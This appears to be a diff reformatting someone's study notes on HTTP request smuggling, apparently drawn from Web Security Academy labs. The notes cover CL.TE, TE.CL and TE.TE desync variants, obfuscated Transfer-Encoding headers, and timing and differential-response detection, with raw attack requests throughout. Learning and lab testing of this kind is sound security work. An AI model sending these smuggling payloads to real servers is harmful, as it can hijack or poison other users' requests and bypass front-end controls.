@@ -1,7 +1,7 @@
 HTTP/1 specification provides two different ways to specify where a request ends: 
-Content-Length header / Transfer-Encoding header
+`Content-Length header` / `Transfer-Encoding header`
 
-
+```
 POST /search HTTP/1.1
 Host: normal-website.com
 Content-Type: application/x-www-form-urlencoded
@@ -10,23 +10,28 @@ Transfer-Encoding: chunked
 b
 q=smuggling
 0
-
+```
 
 Message body contains one or more chunks of data
+
 Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents
+
 The message is terminated with a chunk of size zero
+
 You need to include the trailing sequence \r\n\r\n following the final 0
 
-if both the Content-Length and Transfer-Encoding headers are present, then the Content-Length header should be ignored
+**if both the Content-Length and Transfer-Encoding headers are present, then the Content-Length header should be ignored**
 
-Websites that use HTTP/2 end-to-end are inherently immune to request smuggling attacks
+**Websites that use HTTP/2 end-to-end are inherently immune to request smuggling attacks**
 
+```
 CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header
 TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header
 TE.TE: the front-end and back-end servers both use the Transfer-Encoding header, but one of them can be induced not to process it by obfuscating the header in some way
+```
 
-
-CL.TE vulnerability:
+## CL.TE vulnerability:
+```
 POST / HTTP/1.1
 Host: www.example.com
 Connection: keep-alive
@@ -37,11 +42,12 @@ Transfer-Encoding: chunked
 0
 
 G
+```
 
 The second response should say: Unrecognized method GPOST
 
-
-TE.CL vulnerability:
+## TE.CL vulnerability:
+```
 POST / HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -55,13 +61,16 @@ Content-Length: 15
 
 x=1
 0
+```
 
 You need to include the trailing sequence \r\n\r\n following the final 0
+
 The second response should say: Unrecognized method GPOST
 
-
-TE.TE behavior: obfuscating the TE header
+## TE.TE behavior: obfuscating the TE header
 Example:
+
+```
 Transfer-Encoding: xchunked
 Transfer-Encoding : chunked
 Transfer-Encoding: chunked
@@ -71,10 +80,11 @@ Transfer-Encoding:[tab]chunked
 X: X[\n]Transfer-Encoding: chunked
 Transfer-Encoding
 : chunked
+```
 
 only one of the front-end or back-end servers processes it, while the other server ignores it
 
-
+```
 POST / HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -89,12 +99,14 @@ Content-Length: 15
 
 x=1
 0
+```
 
 You need to include the trailing sequence \r\n\r\n following the final 0
+
 The second response should say: Unrecognized method GPOST
 
-
-Finding CL.TE vulnerabilities using timing techniques:
+## Finding CL.TE vulnerabilities using timing techniques:
+```
 POST / HTTP/1.1
 Host: vulnerable-website.com
 Transfer-Encoding: chunked
@@ -103,9 +115,10 @@ Content-Length: 4
 1
 A
 X
+```
 
-
-Finding TE.CL vulnerabilities using timing techniques:
+## Finding TE.CL vulnerabilities using timing techniques:
+```
 POST / HTTP/1.1
 Host: vulnerable-website.com
 Transfer-Encoding: chunked
@@ -114,15 +127,18 @@ Content-Length: 6
 0
 
 X
+```
 
-
-Confirming HTTP request smuggling vulnerabilities using differential responses:
+## Confirming HTTP request smuggling vulnerabilities using differential responses:
 sending two requests to the application in quick succession
+
 1. An "attack" request that is designed to interfere with the processing of the next request
+
 2. A "normal" request
 
 
-Confirming CL.TE vulnerabilities using differential responses:
+## Confirming CL.TE vulnerabilities using differential responses:
+```
 POST / HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -133,11 +149,12 @@ Transfer-Encoding: chunked
 
 GET /404 HTTP/1.1
 X-Ignore: X
+```
 
 The second request should receive an HTTP 404 response
 
-
-Confirming TE.CL vulnerabilities using differential responses:
+## Confirming TE.CL vulnerabilities using differential responses:
+```
 POST / HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -151,3 +168,4 @@ Content-Length: 15
 
 x=1
 0
+```
